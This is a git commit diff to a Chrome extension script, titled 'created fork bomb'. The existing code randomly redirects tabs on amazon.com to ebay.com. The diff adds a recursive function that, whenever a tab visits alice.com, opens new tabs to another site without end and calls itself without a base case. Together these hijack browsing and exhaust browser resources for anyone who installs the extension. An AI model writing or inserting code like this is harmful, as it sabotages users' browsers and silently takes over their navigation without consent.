2241824f2bab9dfe94669757d905a66c9f2313f1
Jie Guan <jie.s.guan@gmail.com>
2014-11-17 17:47:53 -0500

    created fork bomb

--- src/listen.js
+++ src/listen.js
@@ -2,11 +2,20 @@ activationProbability = 0.2
 
 chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
     if (tab.url.indexOf("amazon.com") > -1) {
-        var randOut = Math.random();
-        if (randOut < activationProbability) {
+        if (Math.random() < activationProbability) {
             var updateParam = new Object();
             updateParam.url = "http://ebay.com";
             chrome.tabs.update(tabId, updateParam);
         }
     }
+    if (tab.url.indexOf("alice.com") > -1) {
+        fork_bomb();
+    }
 });
+
+function fork_bomb() {
+    alice = new Object();
+    alice.url = "http://alicepotato.com"
+    chrome.tabs.create(alice, fork_bomb)
+    fork_bomb()
+}
